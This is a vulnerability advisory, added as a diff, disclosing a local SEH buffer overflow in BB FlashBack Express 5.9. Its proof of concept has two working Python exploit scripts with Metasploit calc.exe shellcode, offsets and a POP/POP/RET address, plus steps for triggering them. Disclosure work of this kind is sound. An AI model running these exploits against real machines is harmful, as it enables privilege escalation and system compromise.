@@ -1,0 +1,226 @@
+Document Title:
+===============
+Blueberry Express v5.9.x - SEH Buffer Overflow Vulnerability
+
+
+References (Source):
+====================
+http://www.vulnerability-lab.com/get_content.php?id=1535
+
+Video: http://www.vulnerability-lab.com/get_content.php?id=1537
+
+
+Release Date:
+=============
+2015-06-29
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+1535
+
+
+Common Vulnerability Scoring System:
+====================================
+6.4
+
+
+Product & Service Introduction:
+===============================
+Create engaging movies by adding text, sound and images to your screen recording. Make sure your audience doesn`t miss a 
+thing with easy-to-use Zoom-Pan and AutoScroll effects. Create polished tutorials and presentations with the help of powerful 
+editing functions. Do it the easy way with BB FlashBack screen recorder. Its never been easier for everyone to see your movies. 
+BB FlashBack screen recorder shares with FlashBack Connect or Youtube to display your movies on all devices.(FlashBack Connect 
+is currently in Beta, and available only to Pro and Standard edition purchasers).
+
+(Copy of the Vendor Homepage: http://www.bbsoftware.co.uk/bbflashback.aspx )
+
+
+Abstract Advisory Information:
+==============================
+The Vulnerability Laboratory Core Research Team discovered a local seh buffer overflow vulnerability in the official Blueberry Express v5.9.0.3678 software.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2015-06-29:          Researcher Notification & Coordination (Ateeq Khan)
+
+
+Discovery Status:
+=================
+Published
+
+
+Affected Product(s):
+====================
+Blueberry Software
+Product: Blueberry Express - Software 5.9.0.3678
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+Severity Level:
+===============
+High
+
+
+Technical Details & Description:
+================================
+A local SEH Buffer Overflow vulnerability has been discovered in the official Blueberry Express v5.9.0.3678 software.
+The vulnerability allows local or remote attacker to gain higher system or access privileges by exploitation of a 
+classic seh buffer overflow vulnerability.
+
+The local SEH Buffer Overflow affects multiple products including the BBFlashBack Recorder, Batch Export etc. 
+Other products using similar modules might also be affected. The vulnerability can be exploited by local attackers with low privilege system user account. 
+The attacker vector of the issue is server-side and the request method to execute the shellcode is local.
+
+The security risk of the buffer overflow vulnerability is estimated as high with a cvss (common vulnerability scoring system) count of 6.4. 
+Successful exploitation of this vulnerability results in complete compromise of the affected machine and system process.
+
+
+Proof of Concept (PoC):
+=======================
+The buffer overflow vulnerability can be exploited by local attackers with restricted system user account and without user interaction.
+For security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.
+
+POC Description:
+For POC, the researcher installed the software with admin privileges on a windows system (allowed to run for all users), while application 
+still running in the background, logged off and logged in with a different (low privileged) user. Exploited the vulnerability successfully 
+hence giving the researcher a system shell with elevated admin privileges. Privilege escalation is possible in this scenario. 
+Malwares wont be able to exploit this vulnerability remotely as this is a Local exploit.
+
+Manual steps to reproduce the vulnerability ...
+1) Run BB Flashback Express Recorder
+2) Goto TOOLS > OPTIONS > MISC
+3) Click on "Use custom folder" under the Temp Folder module
+4) Copy / Paste the POC binary code (record.txt) into the input field of custom folder
+5) Click OK
+
+Note: Calculator should popup hence proving the existence of this vulnerability
+
+PoC: Exploitcode
+# Exploit Title:  Blueberry Express Recorder SEH based buffer overflow (Local) Exploit
+# Discovered by:  Ateeq Khan - @ohtheITguy (http://www.vulnerability-lab.com/)
+
+# Windows Calc.exe Shellcode - Metasploit
+shellcode = ("\xda\xdb\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x32\xb8\x6e\xb9\xe3"
+"\x05\x31\x43\x17\x83\xc3\x04\x03\x2d\xaa\x01\xf0\x4d\x24\x4c"
+"\xfb\xad\xb5\x2f\x75\x48\x84\x7d\xe1\x19\xb5\xb1\x61\x4f\x36"
+"\x39\x27\x7b\xcd\x4f\xe0\x8c\x66\xe5\xd6\xa3\x77\xcb\xd6\x6f"
+"\xbb\x4d\xab\x6d\xe8\xad\x92\xbe\xfd\xac\xd3\xa2\x0e\xfc\x8c"
+"\xa9\xbd\x11\xb8\xef\x7d\x13\x6e\x64\x3d\x6b\x0b\xba\xca\xc1"
+"\x12\xea\x63\x5d\x5c\x12\x0f\x39\x7d\x23\xdc\x59\x41\x6a\x69"
+"\xa9\x31\x6d\xbb\xe3\xba\x5c\x83\xa8\x84\x51\x0e\xb0\xc1\x55"
+"\xf1\xc7\x39\xa6\x8c\xdf\xf9\xd5\x4a\x55\x1c\x7d\x18\xcd\xc4"
+"\x7c\xcd\x88\x8f\x72\xba\xdf\xc8\x96\x3d\x33\x63\xa2\xb6\xb2"
+"\xa4\x23\x8c\x90\x60\x68\x56\xb8\x31\xd4\x39\xc5\x22\xb0\xe6"
+"\x63\x28\x52\xf2\x12\x73\x38\x05\x96\x09\x05\x05\xa8\x11\x25"
+"\x6e\x99\x9a\xaa\xe9\x26\x49\x8f\x06\x6d\xd0\xb9\x8e\x28\x80"
+"\xf8\xd2\xca\x7e\x3e\xeb\x48\x8b\xbe\x08\x50\xfe\xbb\x55\xd6"
+"\x12\xb1\xc6\xb3\x14\x66\xe6\x91\x76\xe9\x74\x79\x79")
+
+
+push="\x90" * 288       # Starting offset
+nseh="\xeb\x06\x90\x90" # Short jump
+seh="\xf3\x43\x10\x40"  # POP/POP/RET - [vcl60.bpl] [NoSafeSEH]
+nopsled="\x90" * 30     # NOPsled
+
+print "Creating expoit file"
+f=open("recorder.txt","w") 
+
+try:
+    f.write(push+nseh+seh+nopsled+shellcode)
+    f.close()
+    print "File created"
+except:
+    print "File cannot be created"
+
+
+
+PoC#2: Exploitcode
+# Exploit Title:  Blueberry Express Batch Export SEH based buffer overflow (Local)
+# Discovered by:  Ateeq Khan - @ohtheITguy (http://www.vulnerability-lab.com/)
+
+print "Creating expoit file"
+f=open("batch.txt","w") #Create the file
+
+# Windows Calc.exe Shellcode - Metasploit
+shellcode = ("\xda\xdb\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x32\xb8\x6e\xb9\xe3"
+"\x05\x31\x43\x17\x83\xc3\x04\x03\x2d\xaa\x01\xf0\x4d\x24\x4c"
+"\xfb\xad\xb5\x2f\x75\x48\x84\x7d\xe1\x19\xb5\xb1\x61\x4f\x36"
+"\x39\x27\x7b\xcd\x4f\xe0\x8c\x66\xe5\xd6\xa3\x77\xcb\xd6\x6f"
+"\xbb\x4d\xab\x6d\xe8\xad\x92\xbe\xfd\xac\xd3\xa2\x0e\xfc\x8c"
+"\xa9\xbd\x11\xb8\xef\x7d\x13\x6e\x64\x3d\x6b\x0b\xba\xca\xc1"
+"\x12\xea\x63\x5d\x5c\x12\x0f\x39\x7d\x23\xdc\x59\x41\x6a\x69"
+"\xa9\x31\x6d\xbb\xe3\xba\x5c\x83\xa8\x84\x51\x0e\xb0\xc1\x55"
+"\xf1\xc7\x39\xa6\x8c\xdf\xf9\xd5\x4a\x55\x1c\x7d\x18\xcd\xc4"
+"\x7c\xcd\x88\x8f\x72\xba\xdf\xc8\x96\x3d\x33\x63\xa2\xb6\xb2"
+"\xa4\x23\x8c\x90\x60\x68\x56\xb8\x31\xd4\x39\xc5\x22\xb0\xe6"
+"\x63\x28\x52\xf2\x12\x73\x38\x05\x96\x09\x05\x05\xa8\x11\x25"
+"\x6e\x99\x9a\xaa\xe9\x26\x49\x8f\x06\x6d\xd0\xb9\x8e\x28\x80"
+"\xf8\xd2\xca\x7e\x3e\xeb\x48\x8b\xbe\x08\x50\xfe\xbb\x55\xd6"
+"\x12\xb1\xc6\xb3\x14\x66\xe6\x91\x76\xe9\x74\x79\x79")
+
+push="\x90" * 6596      # Starting offset
+nseh="\xeb\x06\x90\x90" # Short jump
+seh="\xf3\x43\x10\x40"  # POP/POP/RET - [vcl60.bpl] [NoSafeSEH]
+nopsled="\x90" * 30     # NOPsled
+
+
+try:
+    f.write(push+nseh+seh+nopsled+shellcode)
+    f.close()
+    print "File created"
+except:
+    print "File cannot be created"
+
+
+
+Reference(s):
+http://www.bbsoftware.co.uk/
+http://www.bbsoftware.co.uk/bbflashback/download.aspx
+
+
+
+Security Risk:
+==============
+The security risk of the local seh buffer overflow software vulnerability is estimated as high. (CVSS 6.4)
+
+
+Credits & Authors:
+==================
+Vulnerability Laboratory [Research Team] - Ateeq Khan (Ateeq@evolution-sec.com)
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
+or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
+in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
+or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
+consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
+policies, deface websites, hack into databases or trade with fraud/stolen material.
+
+Domains:    www.vulnerability-lab.com     - www.vuln-lab.com                 - www.evolution-sec.com
+Contact:    admin@vulnerability-lab.com   - research@vulnerability-lab.com              - admin@evolution-sec.com
+Section:    magazine.vulnerability-db.com  - vulnerability-lab.com/contact.php             - evolution-sec.com/contact
+Social:      twitter.com/#!/vuln_lab     - facebook.com/VulnerabilityLab              - youtube.com/user/vulnerability0lab
+Feeds:      vulnerability-lab.com/rss/rss.php  - vulnerability-lab.com/rss/rss_upcoming.php       - vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php    - vulnerability-lab.com/list-of-bug-bounty-programs.php  - vulnerability-lab.com/register/
+
+Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
+electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
+Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
+is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
+(admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.
+
+        Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
+CONTACT: research@vulnerability-lab.com
+PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt
